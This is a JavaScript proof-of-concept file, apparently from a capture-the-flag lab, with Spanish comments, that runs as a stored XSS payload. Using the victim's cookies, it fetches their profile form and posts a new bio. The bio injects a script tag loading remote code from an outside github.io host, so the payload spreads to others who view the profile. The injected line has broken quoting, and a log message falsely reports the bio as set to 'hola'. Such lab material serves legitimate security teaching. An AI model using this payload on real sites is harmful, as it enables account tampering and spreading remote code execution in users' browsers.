// payload.js - PoC educativo para CTF HackLab
(async () => {
  console.log("[POC] Script ejecutado en la sesión del usuario.");

  try {
    // Paso 1: obtener el formulario de perfil
    const response = await fetch("/profile", { credentials: "include" });
    const text = await response.text();

    // Paso 2: crear un parser DOM para extraer los valores actuales
    const parser = new DOMParser();
    const doc = parser.parseFromString(text, "text/html");

    const form = doc.querySelector("form");
    if (!form) {
      console.log("[POC] No se encontró el formulario de perfil.");
      return;
    }

    // Extraer valores existentes de los campos para no romper el form
    const username = doc.querySelector('input[name="username"]')?.value || "hacklab";
    const email = doc.querySelector('input[name="email"]')?.value || "pepe@softwareseguro.com.ar";

    // Paso 3: preparar los datos del formulario con bio modificada
    const formData = new FormData();
    formData.append("username", username);
    formData.append("email", email);
    formData.append("bio", "<script src=""https://scursatonegino16.github.io/payload1.js"></script>
"");

    // Paso 4: enviar la petición POST (simula que Pepe actualiza su bio)
    const update = await fetch("/profile", {
      method: "POST",
      body: formData,
      credentials: "include",
    });

    if (update.ok) {
      console.log("[POC] Bio actualizada a 'hola' correctamente.");
    } else {
      console.log("[POC] Falló la actualización del perfil:", update.status);
    }
  } catch (err) {
    console.error("[POC] Error al ejecutar el payload:", err);
  }
})();
